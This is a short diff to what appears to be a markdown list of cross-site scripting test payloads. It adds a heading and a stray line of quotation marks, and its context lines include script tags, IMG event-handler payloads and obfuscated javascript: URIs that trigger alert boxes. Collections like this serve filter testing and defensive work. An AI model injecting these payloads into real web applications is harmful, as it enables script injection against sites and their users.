@@ -1,6 +1,9 @@
 ## xss payloads:
 
 ```
+
+### XSS Payloads
+
 %253Cscript%253Ealert('XSS')%253C%252Fscript%253E
 <IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
@@ -702,5 +705,5 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <IMG SRC="jav ascript:alert('XSS');">
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
-
+""""
 ```
